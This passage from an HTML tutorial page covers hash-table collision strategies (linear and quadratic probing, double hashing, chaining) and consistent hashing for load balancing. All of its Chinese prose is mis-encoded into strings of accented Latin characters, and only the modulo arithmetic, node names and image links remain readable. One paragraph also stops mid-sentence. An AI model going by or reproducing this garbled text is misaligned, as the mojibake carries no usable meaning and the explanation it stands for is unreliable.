<p>é€šè¿‡æ•£åˆ—å‡½æ•°è®¡ç®—å¤„é”®å€¼å¯¹åº”çš„æ•°ç»„ä¸‹æ ‡ï¼Œåˆ°å“ˆå¸Œè¡¨ä¸­å»æŸ¥æ‰¾ï¼Œç„¶åæ¯”è¾ƒå¯¹åº”ä½ç½®çš„é”®å€¼ä¸è®¡ç®—å¾—å‡ºçš„é”®å€¼ï¼Œå¦‚æœç›¸ç­‰åˆ™åŒ¹é…åˆ°äº†æ•°æ®ï¼Œå¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™ä¾æ¬¡å‘ä¸‹æŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ä½ç½®</p>
<p><strong>çº¿æ€§æ¢æµ‹çš„åˆ é™¤</strong></p>
<p>å¦‚æœç›´æ¥åˆ é™¤å¯¹åº”ä¸‹æ ‡å¤„çš„æ•°æ®çš„è¯ï¼Œä¼šå¯¼è‡´åç»­çš„æŸ¥è¯¢æ“ä½œè¿‡ç¨‹ä¸­ä¸èƒ½æŸ¥æ‰¾åˆ°æ­£ç¡®çš„å€¼ï¼Œæ¯”å¦‚é”®å€¼aè®¡ç®—å¾—åˆ°çš„å“ˆå¸Œå€¼ä¸º3ï¼Œä½†å†æ’å…¥çš„æ—¶å€™ï¼Œ3å¯¹åº”çš„ä½ç½®å·²ç»æœ‰å€¼äº†ï¼Œä¾æ¬¡éå†åˆ°ä½ç½®5åæˆåŠŸæ’å…¥ã€‚é‚£ä¹ˆå†åˆ é™¤äº†3å¯¹åº”ä½ç½®çš„å€¼ä¹‹åï¼Œå†æŸ¥è¯¢aå¯¹åº”æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆè®¡ç®—å‡ºæ¥çš„ä¸‹æ ‡ä¸º3ï¼Œé‚£ä¹ˆå°±å»3å¯¹åº”çš„ä½ç½®æ‰¾ï¼Œç»“æœå‘ç°æ—¶ç©ºç™½ï¼Œäºæ˜¯è®¤ä¸ºï¼Œé”®å€¼a,ä¸åœ¨è¯¥å“ˆå¸Œè¡¨ä¸­ï¼Œè¿™å¾ˆæ˜¾ç„¶æ—¶ä¸æ­£ç¡®çš„ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºè¢«åˆ é™¤çš„ä½ç½®æ’å…¥ä¸€ä¸ªç‰¹æ®Šçš„æ ‡å¿—ä½ï¼Œå³å°†è¯¥ä½ç½®çš„æ•°ç»„ä¸‹æ ‡è®¾ä¸º-1æ¥æ ‡è¯†è¯¥å¤„æ•°æ®è¢«åˆ é™¤ã€‚è¿™æ ·ä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœåœ¨çº¿æ€§æ¢æµ‹å“ˆå¸Œè¡¨ä¸­åšäº†å¤šæ¬¡æ“ä½œï¼Œä¼šå¯¼è‡´å“ˆå¸Œè¡¨ä¸­å……æ»¡äº†å­¦å·ä¸º-1çš„æ•°æ®é¡¹ï¼Œä½¿çš„å“ˆå¸Œè¡¨çš„æ•ˆç‡ä¸‹é™ï¼Œæ‰€ä»¥å¾ˆå¤šå“ˆå¸Œè¡¨ä¸­æ²¡æœ‰æä¾›åˆ é™¤æ“ä½œï¼Œå³ä½¿æä¾›äº†åˆ é™¤æ“ä½œçš„ï¼Œä¹Ÿå°½é‡å°‘ä½¿ç”¨åˆ é™¤å‡½æ•°ã€‚</p>
<p><img src="/Untitled%201.png"></p>
<h3 id="äºŒæ¬¡æ¢æµ‹"><a href="#äºŒæ¬¡æ¢æµ‹" class="headerlink" title="äºŒæ¬¡æ¢æµ‹"></a>äºŒæ¬¡æ¢æµ‹</h3><hr>
<p>åœ¨çº¿æ€§æ¢æµ‹å“ˆå¸Œè¡¨ä¸­ï¼Œæ•°æ®ä¼šå‘ç”Ÿèšé›†ï¼Œä¸€æ—¦èšé›†å½¢æˆï¼Œå®ƒå°±ä¼šå˜çš„è¶Šæ¥è¶Šå¤§ï¼Œé‚£äº›å“ˆå¸Œå‡½æ•°åè½åœ¨èšé›†èŒƒå›´å†…çš„æ•°æ®é¡¹ï¼Œéƒ½éœ€è¦ä¸€æ­¥ä¸€æ­¥å¾€åç§»åŠ¨ï¼Œå¹¶ä¸”æ’å…¥åˆ°èšé›†çš„åé¢ï¼Œå› æ­¤èšé›†å˜çš„è¶Šå¤§ï¼Œèšé›†å¢é•¿çš„è¶Šå¿«ã€‚è¿™ä¸ªå°±åƒæˆ‘ä»¬åœ¨é€›è¶…å¸‚ä¸€æ ·ï¼Œå½“æŸä¸ªåœ°æ–¹äººå¾ˆå¤šæ—¶ï¼Œäººåªä¼šè¶Šæ¥è¶Šå¤šï¼Œå¤§å®¶éƒ½åªæ˜¯æƒ³çŸ¥é“è¿™é‡Œåœ¨å¹²ä»€ä¹ˆã€‚</p>
<p>äºŒæ¬¡æ¢æµ‹æ˜¯é˜²æ­¢èšé›†äº§ç”Ÿçš„ä¸€ç§å°è¯•ï¼Œæ€æƒ³æ˜¯æ¢æµ‹ç›¸éš”è¾ƒè¿œçš„å•å…ƒï¼Œè€Œä¸æ˜¯å’ŒåŸå§‹ä½ç½®ç›¸é‚»çš„å•å…ƒã€‚åœ¨çº¿æ€§æ¢æµ‹ä¸­ï¼Œå¦‚æœå“ˆå¸Œå‡½æ•°å¾—åˆ°çš„åŸå§‹ä¸‹æ ‡æ˜¯x,çº¿æ€§æ¢æµ‹å°±æ˜¯x+1,x+2,x+3â€¦â€¦ï¼Œä»¥æ­¤ç±»æ¨ï¼Œè€Œåœ¨äºŒæ¬¡æ¢æµ‹ä¸­ï¼Œæ¢æµ‹è¿‡ç¨‹æ˜¯x+1,x+4,x+9,x+16,x+25â€¦â€¦,ä»¥æ­¤ç±»æ¨ï¼Œåˆ°åŸå§‹è·ç¦»çš„æ­¥æ•°å¹³æ–¹ï¼Œä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢è¿™å¼ å›¾</p>
<p><img src="/Untitled%202.png"></p>
<p>äºŒæ¬¡æ¢æµ‹æ¶ˆé™¤äº†çº¿æ€§æ¢æµ‹çš„èšé›†é—®é¢˜ï¼Œè¿™ç§èšé›†é—®é¢˜å«åšåŸå§‹èšé›†ï¼Œç„¶è€Œï¼ŒäºŒæ¬¡æ¢æµ‹ä¹Ÿäº§ç”Ÿäº†æ–°çš„èšé›†é—®é¢˜ï¼Œä¹‹æ‰€ä»¥ä¼šäº§ç”Ÿæ–°çš„èšé›†é—®é¢˜ï¼Œæ˜¯å› ä¸ºæ‰€æœ‰æ˜ å°„åˆ°åŒä¸€ä½ç½®çš„å…³é”®å­—åœ¨å¯»æ‰¾ç©ºä½æ—¶ï¼Œæ¢æµ‹çš„ä½ç½®éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>æ¯”å¦‚è®²1ã€11ã€21ã€31ã€41ä¾æ¬¡æ’å…¥åˆ°å“ˆå¸Œè¡¨ä¸­ï¼Œå®ƒä»¬æ˜ å°„çš„ä½ç½®éƒ½æ˜¯1ï¼Œé‚£ä¹ˆ11éœ€è¦ä»¥ä¸€ä¸ºæ­¥é•¿æ¢æµ‹ï¼Œ21éœ€è¦ä»¥å››ä¸ºæ­¥é•¿æ¢æµ‹ï¼Œ31éœ€è¦ä¸ºä¹ä¸ºæ­¥é•¿æ¢æµ‹ï¼Œ41éœ€è¦ä»¥åå…­ä¸ºæ­¥é•¿æ¢æµ‹ï¼Œåªè¦æœ‰ä¸€é¡¹æ˜ å°„åˆ°1çš„ä½ç½®ï¼Œå°±éœ€è¦æ›´é•¿çš„æ­¥é•¿æ¥æ¢æµ‹ï¼Œè¿™ä¸ªç°è±¡å«åšäºŒæ¬¡èšé›†ã€‚</p>
<h3 id="åŒå“ˆå¸Œ"><a href="#åŒå“ˆå¸Œ" class="headerlink" title="åŒå“ˆå¸Œ"></a>åŒå“ˆå¸Œ</h3><hr>
<p>åŒå“ˆå¸Œæ˜¯ä¸ºäº†æ¶ˆé™¤åŸå§‹èšé›†å’ŒäºŒæ¬¡èšé›†é—®é¢˜ï¼Œä¸ç®¡æ˜¯çº¿æ€§æ¢æµ‹è¿˜æ˜¯äºŒæ¬¡æ¢æµ‹ï¼Œæ¯æ¬¡çš„æ¢æµ‹æ­¥é•¿éƒ½æ˜¯å›ºå®šçš„ã€‚åŒå“ˆå¸Œæ˜¯é™¤äº†ç¬¬ä¸€ä¸ªå“ˆå¸Œå‡½æ•°å¤–å†å¢åŠ ä¸€ä¸ªå“ˆå¸Œå‡½æ•°ç”¨æ¥æ ¹æ®å…³é”®å­—ç”Ÿæˆæ¢æµ‹æ­¥é•¿ï¼Œè¿™æ ·å³ä½¿ç¬¬ä¸€ä¸ªå“ˆå¸Œå‡½æ•°æ˜ å°„åˆ°äº†æ•°ç»„çš„åŒä¸€ä¸‹æ ‡ï¼Œä½†æ˜¯æ¢æµ‹æ­¥é•¿ä¸ä¸€æ ·ï¼Œè¿™æ ·å°±èƒ½å¤Ÿè§£å†³èšé›†çš„é—®é¢˜ã€‚</p>
<p><img src="/Untitled%203.png"></p>
<p>ç¬¬äºŒä¸ªå“ˆå¸Œå‡½æ•°å¿…é¡»æ»¡è¶³ï¼š</p>
<ol>
<li>å’Œç¬¬ä¸€ä¸ªå“ˆå¸Œå‡½æ•°ä¸ä¸€æ ·</li>
<li>ä¸èƒ½ä¸º0</li>
</ol>
<p>å“ˆå¸Œè¡¨çš„å®¹é‡å¿…é¡»æ˜¯ä¸€ä¸ªè´¨æ•°ï¼š</p>
<p>å‡è®¾æˆ‘ä»¬å“ˆå¸Œè¡¨çš„å®¹é‡ä¸º15ï¼ŒæŸä¸ª**ã€Œå…³é”®å­—ã€**ç»è¿‡åŒå“ˆå¸Œå‡½æ•°åå¾—åˆ°çš„æ•°ç»„ä¸‹æ ‡ä¸º0ï¼Œæ­¥é•¿ä¸º5ã€‚é‚£ä¹ˆè¿™ä¸ªæ¢æµ‹è¿‡ç¨‹æ˜¯0,5,10,0,5,10ï¼Œä¸€ç›´åªä¼šå°è¯•è¿™ä¸‰ä¸ªä½ç½®ï¼Œæ°¸è¿œæ‰¾ä¸åˆ°ç©ºç™½ä½ç½®æ¥å­˜æ”¾ï¼Œæœ€ç»ˆä¼šå¯¼è‡´å´©æºƒã€‚</p>
<p>å¦‚æœæˆ‘ä»¬å“ˆå¸Œè¡¨çš„å¤§å°ä¸º13ï¼ŒæŸä¸ª**ã€Œå…³é”®å­—ã€**ç»è¿‡åŒå“ˆå¸Œå‡½æ•°åå¾—åˆ°çš„æ•°ç»„ä¸‹æ ‡ä¸º0ï¼Œæ­¥é•¿ä¸º5ã€‚é‚£ä¹ˆè¿™ä¸ªæ¢æµ‹è¿‡ç¨‹æ˜¯0,5,10,2,7,12,4,9,1,6,11,3ã€‚ä¼šæŸ¥æ‰¾åˆ°å“ˆå¸Œè¡¨ä¸­çš„æ¯ä¸€ä¸ªä½ç½®ã€‚</p>
<p>ä½¿ç”¨å¼€æ”¾åœ°å€æ³•ï¼Œä¸ç®¡ä½¿ç”¨é‚£ç§ç­–ç•¥éƒ½ä¼šæœ‰å„ç§é—®é¢˜ï¼Œå¼€æ”¾åœ°å€æ³•ä¸æ€ä¹ˆä½¿ç”¨ï¼Œåœ¨å¼€æ”¾åœ°å€æ³•ä¸­ä½¿ç”¨è¾ƒå¤šçš„æ˜¯åŒå“ˆå¸Œç­–ç•¥ã€‚</p>
<h2 id="é“¾è¡¨æ³•"><a href="#é“¾è¡¨æ³•" class="headerlink" title="é“¾è¡¨æ³•"></a>é“¾è¡¨æ³•</h2><hr>
<p>å¼€æ”¾åœ°å€æ³•ä¸­ï¼Œé€šè¿‡åœ¨å“ˆå¸Œè¡¨ä¸­å†å¯»æ‰¾ä¸€ä¸ªç©ºä½è§£å†³å†²çªçš„é—®é¢˜ï¼Œè¿˜æœ‰ä¸€ç§æ›´åŠ å¸¸ç”¨çš„åŠæ³•æ˜¯ä½¿ç”¨ã€Œé“¾è¡¨æ³•ã€æ¥è§£å†³å“ˆå¸Œå†²çªã€‚ã€Œé“¾è¡¨æ³•ã€ç›¸å¯¹ç®€å•å¾ˆå¤šï¼Œã€Œé“¾è¡¨æ³•ã€æ˜¯æ¯ä¸ªæ•°ç»„å¯¹åº”ä¸€æ¡é“¾è¡¨ã€‚å½“æŸé¡¹å…³é”®å­—é€šè¿‡å“ˆå¸Œåè½åˆ°å“ˆå¸Œè¡¨ä¸­çš„æŸä¸ªä½ç½®ï¼ŒæŠŠè¯¥æ¡æ•°æ®æ·»åŠ åˆ°é“¾è¡¨ä¸­ï¼Œå…¶ä»–åŒæ ·æ˜ å°„åˆ°è¿™ä¸ªä½ç½®çš„æ•°æ®é¡¹ä¹Ÿåªéœ€è¦æ·»åŠ åˆ°é“¾è¡¨ä¸­ï¼Œå¹¶ä¸éœ€è¦åœ¨åŸå§‹æ•°ç»„ä¸­å¯»æ‰¾ç©ºä½æ¥å­˜å‚¨ã€‚ä¸‹å›¾æ˜¯ã€Œé“¾è¡¨æ³•ã€çš„ç¤ºæ„å›¾ã€‚</p>
<p><img src="/Untitled%204.png"></p>
<h1 id="ä¸€è‡´æ€§å“ˆå¸Œ"><a href="#ä¸€è‡´æ€§å“ˆå¸Œ" class="headerlink" title="ä¸€è‡´æ€§å“ˆå¸Œ"></a>ä¸€è‡´æ€§å“ˆå¸Œ</h1><hr>
<p>åœ¨è¿›è¡Œè´Ÿè½½å‡è¡¡è°ƒåº¦çš„æ—¶å€™ï¼Œå¾€å¾€ç”¨åˆ°å“ˆå¸Œç®—æ³•ï¼Œé€šè¿‡å“ˆå¸Œå‡½æ•°ï¼Œå°†æ•°æ®æ˜ å°„åˆ°å¯¹åº”çš„æœåŠ¡å™¨é›†ç¾¤ä¸Šé¢ï¼Œä¼ ç»Ÿçš„å“ˆå¸Œå‡½æ•°å­˜åœ¨ç€å¯æ‰©å±•æ€§å·®ï¼Œå®¹é”™èƒ½åŠ›å·®çš„é—®é¢˜</p>
<h2 id="å¯æ‰©å±•æ€§"><a href="#å¯æ‰©å±•æ€§" class="headerlink" title="å¯æ‰©å±•æ€§"></a><strong>å¯æ‰©å±•æ€§</strong></h2><hr>
<p>å‡è®¾æœ‰ 3 ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ç¼–å· [0 - 2]ï¼Œ6 ä¸ªç¼“å­˜é”®å€¼å¯¹ç¼–å· [1 - 6]ï¼Œåˆ™å®Œæˆå“ˆå¸Œæ˜ å°„ä¹‹åï¼Œä¸‰ä¸ªç¼“å­˜æ•°æ®æ˜ å°„æƒ…å†µå¦‚ä¸‹ï¼š</p>
<p>å“ˆå¸Œè®¡ç®—å…¬å¼ï¼škey % èŠ‚ç‚¹æ€»æ•° &#x3D; HashèŠ‚ç‚¹ä¸‹æ ‡</p>
<p>1 % 3 &#x3D; 1</p>
<p>2 % 3 &#x3D; 2</p>
<p>3 % 3 &#x3D; 0</p>
<p>4 % 3 &#x3D; 1</p>
<p>5 % 3 &#x3D; 2</p>
<p>6 % 3 &#x3D; 0</p>
<p><img src="/Untitled%205.png"></p>
<p>æ¯ä¸ªè¿æ¥éƒ½å‡åŒ€çš„åˆ†æ•£åˆ°äº†ä¸‰ä¸ªä¸åŒçš„æœåŠ¡å™¨èŠ‚ç‚¹ä¸Šï¼Œçœ‹èµ·æ¥å¾ˆå®Œç¾ï¼</p>
<p>ä½†æ˜¯ï¼Œåœ¨åˆ†å¸ƒå¼é›†ç¾¤ç³»ç»Ÿçš„è´Ÿè½½å‡è¡¡å®ç°ä¸Šï¼Œè¿™ç§æ¨¡å‹æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<p><strong>æ‰©å±•èƒ½åŠ›å·®</strong></p>
<p>ä¸ºäº†åŠ¨æ€è°ƒèŠ‚æœåŠ¡èƒ½åŠ›ï¼ŒæœåŠ¡èŠ‚ç‚¹ç»å¸¸éœ€è¦æ‰©å®¹ç¼©å®¹ã€‚æ‰“ä¸ªæ¯”æ–¹ï¼Œå¦‚æœæ˜¯ç”µå•†æœåŠ¡ï¼ŒåŒåä¸€æœŸé—´çš„æœåŠ¡æœºå™¨æ•°é‡è‚¯å®šè¦æ¯”å¹³å¸¸å¤§å¾ˆå¤šï¼Œæ–°åŠ è¿›æ¥çš„æœºå™¨ä¼šä½¿åŸæ¥è®¡ç®—çš„å“ˆå¸Œå€¼ä¸å‡†ç¡®ï¼Œä¸ºäº†è¾¾åˆ°è´Ÿè½½å‡è¡¡çš„æ•ˆæœï¼Œè¦é‡æ–°è®¡ç®—å¹¶æ›´æ–°å“ˆå¸Œå€¼ï¼Œå¯¹äºæ›´æ–°åå“ˆå¸Œå€¼ä¸ä¸€è‡´çš„ç¼“å­˜æ•°æ®ï¼Œè¦è¿ç§»åˆ°æ›´æ–°åçš„èŠ‚ç‚¹ä¸Šå»ã€‚</p>
<p>å‡è®¾æ–°å¢äº† 1 ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œç”±åŸæ¥çš„ 3 ä¸ªæœåŠ¡èŠ‚ç‚¹å˜æˆ 4 ä¸ªèŠ‚ç‚¹ç¼–å· [0 - 3]ï¼Œå“ˆå¸Œæ˜ å°„æƒ…å†µå¦‚ä¸‹ï¼š</p>
<p>å“ˆå¸Œè®¡ç®—å…¬å¼ï¼škey % èŠ‚ç‚¹æ€»æ•° &#x3D; HashèŠ‚ç‚¹ä¸‹æ ‡</p>
<p>1 % 4 &#x3D; 1</p>
<p>2 % 4 &#x3D; 2</p>
<p>3 % 4 &#x3D; 3</p>
<p>4 % 4 &#x3D; 0</p>
<p>5 % 4 &#x3D; 1</p>
<p>6 % 4 &#x3D; 2</p>
<p>å¯ä»¥çœ‹åˆ°åé¢ä¸‰ä¸ªç¼“å­˜ key ï¼š4ã€5ã€6 å¯¹åº”çš„å­˜å‚¨èŠ‚ç‚¹å…¨éƒ¨å¤±æ•ˆäº†ï¼Œè¿™å°±éœ€è¦æŠŠè¿™å‡ ä¸ªèŠ‚ç‚¹çš„ç¼“å­˜æ•°æ®è¿ç§»åˆ°æ›´æ–°åçš„èŠ‚ç‚¹ä¸Š (è´¹æ—¶è´¹åŠ›) ï¼Œä¹Ÿå°±æ˜¯ç”±åŸæ¥çš„èŠ‚ç‚¹ [1, 2, 0] è¿ç§»åˆ°èŠ‚ç‚¹ [0, 1, 2]ï¼Œè¿ç§»åå­˜å‚¨ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="/Untitled%206.png"></p>
<p><strong>å®¹é”™èƒ½åŠ›ä¸ä½³</strong></p>
<p>çº¿ä¸Šç¯å¢ƒæœåŠ¡èŠ‚ç‚¹è™½ç„¶æœ‰å„ç§é«˜å¯ç”¨æ€§ä¿è¯ï¼Œä½†è¿˜æ˜¯æ˜¯æœ‰å®•æœºçš„å¯èƒ½ï¼Œå³ä½¿æ²¡æœ‰å®•æœºä¹Ÿæœ‰ç¼©å®¹çš„éœ€æ±‚ã€‚ä¸ç®¡æ˜¯å®•æœºå’Œç¼©å®¹éƒ½å¯ä»¥å½’ç»“ä¸ºæœåŠ¡èŠ‚ç‚¹åˆ é™¤çš„æƒ…å†µï¼Œä¸‹é¢åˆ†æä¸‹æœåŠ¡èŠ‚ç‚¹åˆ é™¤å¯¹è´Ÿè½½å‡è¡¡å“ˆå¸Œå€¼çš„å½±å“ã€‚</p>
<p>å‡è®¾åˆ é™¤ 1 ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œç”±æœ€åˆçš„ 3 ä¸ªæœåŠ¡èŠ‚ç‚¹å˜æˆ 2 ä¸ªï¼ŒèŠ‚ç‚¹ç¼–å· [0 - 1]ï¼Œå“ˆå¸Œæ˜ å°„æƒ…å†µå¦‚ä¸‹ï¼š</p>
<p>å“ˆå¸Œè®¡ç®—å…¬å¼ï¼škey % èŠ‚ç‚¹æ€»æ•° &#x3D; HashèŠ‚ç‚¹ä¸‹æ ‡</p>
<p>1 % 2 &#x3D; 1</p>
<p>2 % 2 &#x3D; 0</p>
<p>3 % 2 &#x3D; 1</p>
<p>4 % 2 &#x3D; 0</p>
<p>5 % 2 &#x3D; 1</p>
<p>6 % 2 &#x3D; 0</p>
<p>ä¸‹å›¾å±•ç¤ºæ™®é€šå“ˆå¸Œè´Ÿè½½å‡è¡¡ç®—æ³•åœ¨ä¸€ä¸ªèŠ‚ç‚¹å®•æœºæ—¶å€™ï¼Œå¯¼è‡´çš„çš„ç¼“å­˜æ•°æ®è¿ç§»åˆ†å¸ƒ</p>
<p><img src="/Untitled%207.png"></p>
<p>å¦‚å›¾æ‰€è§ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»…ä»…åˆ é™¤äº†ä¸€ä¸ªæœåŠ¡èŠ‚ç‚¹ï¼Œä¹Ÿå¯¼è‡´äº†å“ˆå¸Œå€¼çš„å¤§é¢ç§¯æ›´æ–°ï¼Œå“ˆå¸Œå€¼çš„æ›´æ–°ä¹Ÿæ˜¯æ„å‘³ç€èŠ‚ç‚¹ç¼“å­˜æ•°æ®çš„è¿ç§»ã€‚</p>
<h2 id="ä¸€è‡´æ€§å“ˆå¸Œ-1"><a href="#ä¸€è‡´æ€§å“ˆå¸Œ-1" class="headerlink" title="ä¸€è‡´æ€§å“ˆå¸Œ"></a>ä¸€è‡´æ€§å“ˆå¸Œ</h2><hr>
<p>ä¸€å¥è¯æ¦‚æ‹¬ä¸€è‡´æ€§å“ˆå¸Œï¼šå°±æ˜¯æ™®é€šå–æ¨¡å“ˆå¸Œç®—æ³•çš„æ”¹è‰¯ç‰ˆï¼Œå“ˆå¸Œå‡½æ•°è®¡ç®—æ–¹æ³•ä¸å˜ï¼Œåªä¸è¿‡æ˜¯é€šè¿‡æ„å»ºç¯çŠ¶çš„ Hash ç©ºé—´ä»£æ›¿æ™®é€šçš„çº¿æ€§ Hash ç©ºé—´ã€‚å…·ä½“åšæ³•å¦‚ä¸‹ï¼š</p>
<p>é¦–å…ˆï¼Œé€‰æ‹©ä¸€ä¸ªè¶³å¤Ÿå¤§çš„Hashç©ºé—´ï¼ˆä¸€èˆ¬æ˜¯ 0 ~ 2^32ï¼‰æ„æˆä¸€ä¸ªå“ˆå¸Œç¯ã€‚</p>
<p><img src="/Untitled%208.png"></p>
<p>ç„¶åï¼Œå¯¹äºç¼“å­˜é›†ç¾¤å†…çš„æ¯ä¸ªå­˜å‚¨æœåŠ¡å™¨èŠ‚ç‚¹è®¡ç®— Hash å€¼ï¼Œå¯ä»¥ç”¨æœåŠ¡å™¨çš„ IP æˆ– ä¸»æœºåè®¡ç®—å¾—åˆ°å“ˆå¸Œå€¼ï¼Œè®¡ç®—å¾—åˆ°çš„å“ˆå¸Œå€¼å°±æ˜¯æœåŠ¡èŠ‚ç‚¹åœ¨ Hash ç¯ä¸Šçš„ä½ç½®ã€‚</p>
<p><img src="/Untitled%209.png"></p>
<p>æœ€åï¼Œå¯¹æ¯ä¸ªéœ€è¦å­˜å‚¨çš„æ•°æ® key åŒæ ·ä¹Ÿè®¡ç®—ä¸€æ¬¡å“ˆå¸Œå€¼ï¼Œè®¡ç®—ä¹‹åçš„å“ˆå¸Œä¹Ÿæ˜ å°„åˆ°ç¯ä¸Šï¼Œæ•°æ®å­˜å‚¨çš„ä½ç½®æ˜¯æ²¿é¡ºæ—¶é’ˆçš„æ–¹å‘æ‰¾åˆ°çš„ç¯ä¸Šçš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚ä¸‹å›¾ä¸¾ä¾‹å±•ç¤ºäº†èŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®æƒ…å†µï¼Œæˆ‘ä»¬ä¸‹é¢çš„è¯´æ˜ä¹Ÿæ˜¯åŸºäºç›®å‰çš„å­˜å‚¨æƒ…å†µæ¥å±•å¼€ã€‚</p>
<p><img src="/Untitled%2010.png"></p>
<p>åŸç†è®²å®Œäº†ï¼Œæ¥çœ‹çœ‹ä¸ºä»€ä¹ˆè¿™æ ·çš„è®¾è®¡èƒ½è§£å†³ä¸Šé¢æ™®é€šå“ˆå¸Œçš„ä¸¤ä¸ªé—®é¢˜ã€‚</p>
<p><strong>æ‰©å±•èƒ½åŠ›æå‡</strong></p>
<p>å‰é¢æˆ‘ä»¬åˆ†æè¿‡ï¼Œæ™®é€šå“ˆå¸Œç®—æ³•å½“éœ€è¦æ‰©å®¹å¢åŠ æœåŠ¡èŠ‚ç‚¹çš„æ—¶å€™ï¼Œä¼šå¯¼è‡´åŸæ²¹å“ˆå¸Œæ˜ å°„å¤§é¢ç§¯å¤±æ•ˆã€‚ç°åœ¨ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ä¸€è‡´æ€§å“ˆå¸Œæ˜¯å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜çš„ã€‚</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå½“ç¼“å­˜æœåŠ¡é›†ç¾¤è¦æ–°å¢ä¸€ä¸ªèŠ‚ç‚¹node3æ—¶ï¼Œå—å½±å“çš„åªæœ‰ key3 å¯¹åº”çš„æ•°æ® value3ï¼Œæ­¤æ—¶åªéœ€æŠŠ value3 ç”±åŸæ¥çš„èŠ‚ç‚¹ node0 è¿ç§»åˆ°æ–°å¢èŠ‚ç‚¹ node3 å³å¯ï¼Œå…¶ä½™èŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®ä¿æŒä¸åŠ¨ã€‚</p>
<p><img src="/Untitled%2011.png"></p>
<p><strong>å®¹é”™èƒ½åŠ›æå‡</strong></p>
<p>æ™®é€šå“ˆå¸Œç®—æ³•å½“æŸä¸€æœåŠ¡èŠ‚ç‚¹å®•æœºä¸‹çº¿ï¼Œä¹Ÿä¼šå¯¼è‡´åŸæ¥å“ˆå¸Œæ˜ å°„çš„å¤§é¢ç§¯å¤±æ•ˆï¼Œå¤±æ•ˆçš„æ˜ å°„è§¦å‘æ•°æ®è¿ç§»å½±å“ç¼“å­˜æœåŠ¡æ€§èƒ½ï¼Œå®¹é”™èƒ½åŠ›ä¸è¶³ã€‚ä¸€èµ·æ¥çœ‹ä¸‹ä¸€è‡´æ€§å“ˆå¸Œæ˜¯å¦‚ä½•æå‡å®¹é”™èƒ½åŠ›çš„ã€‚</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå‡è®¾ node2 èŠ‚ç‚¹å®•æœºä¸‹çº¿ï¼Œåˆ™åŸæ¥å­˜å‚¨äº node2 çš„æ•°æ® value2 å’Œ value5 ï¼Œåªéœ€æŒ‰é¡ºæ—¶é’ˆæ–¹å‘é€‰æ‹©æ–°çš„å­˜å‚¨èŠ‚ç‚¹ node0 å­˜æ”¾å³å¯ï¼Œä¸ä¼šå¯¹å…¶ä»–èŠ‚ç‚¹æ•°æ®äº§ç”Ÿå½±å“ã€‚ä¸€è‡´æ€§å“ˆå¸Œèƒ½æŠŠèŠ‚ç‚¹å®•æœºé€ æˆçš„å½±å“æ§åˆ¶åœ¨é¡ºæ—¶é’ˆç›¸é‚»èŠ‚ç‚¹ä¹‹é—´ï¼Œé¿å…å¯¹æ•´ä¸ªé›†ç¾¤é€ </p>
<p><img src="/Untitled%2012.png"></p>
<p><strong>ä¸€è‡´æ€§å“ˆå¸Œä¼˜åŒ–</strong></p>
<p><strong>å­˜åœ¨çš„é—®é¢˜</strong></p>
<p>ä¸Šé¢å±•ç¤ºäº†ä¸€è‡´æ€§å“ˆå¸Œå¦‚ä½•è§£å†³æ™®é€šå“ˆå¸Œçš„æ‰©å±•å’Œå®¹é”™é—®é¢˜ï¼ŒåŸç†æ¯”è¾ƒç®€å•ï¼Œåœ¨ç†æƒ³æƒ…å†µä¸‹å¯ä»¥è‰¯å¥½è¿è¡Œï¼Œä½†åœ¨å®é™…ä½¿ç”¨ä¸­è¿˜æœ‰ä¸€äº›å®é™…é—®é¢˜éœ€è¦è€ƒè™‘ï¼Œä¸‹é¢å…·ä½“åˆ†æã€‚</p>
<p><strong>æ•°æ®å€¾æ–œ</strong></p>
<p>è¯•æƒ³ä¸€ä¸‹è‹¥ç¼“å­˜é›†ç¾¤å†…çš„æœåŠ¡èŠ‚ç‚¹æ¯”è¾ƒå°‘ï¼Œå°±åƒæˆ‘ä»¬ä¾‹å­ä¸­çš„ä¸‰ä¸ªèŠ‚ç‚¹ï¼Œè€Œå“ˆå¸Œç¯çš„ç©ºé—´åˆæœ‰å¾ˆå¤§ï¼ˆä¸€èˆ¬æ˜¯ 0 ~ 2^32ï¼‰ï¼Œè¿™ä¼šå¯¼è‡´ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ</p>
<p>å¯èƒ½çš„ä¸€ç§æƒ…å†µæ˜¯ï¼Œè¾ƒå°‘çš„æœåŠ¡èŠ‚ç‚¹å“ˆå¸Œå€¼èšé›†åœ¨ä¸€èµ·ï¼Œæ¯”å¦‚ä¸‹å›¾æ‰€ç¤ºè¿™ç§æƒ…å†µ node0 ã€node1ã€node2 èšé›†åœ¨ä¸€èµ·ï¼Œç¼“å­˜æ•°æ®çš„ key å“ˆå¸Œéƒ½æ˜ å°„åˆ° node2 çš„é¡ºæ—¶é’ˆæ–¹å‘ï¼Œæ•°æ®æŒ‰é¡ºæ—¶é’ˆå¯»æ‰¾å­˜å‚¨èŠ‚ç‚¹å°±å¯¼è‡´å…¨éƒ½å­˜å‚¨åˆ° node0 ä¸Šå»ï¼Œç»™å•ä¸ªèŠ‚ç‚¹å¾ˆå¤§çš„å‹åŠ›ï¼è¿™ç§æƒ…å†µç§°ä¸ºæ•°æ®å€¾æ–œã€‚</p>
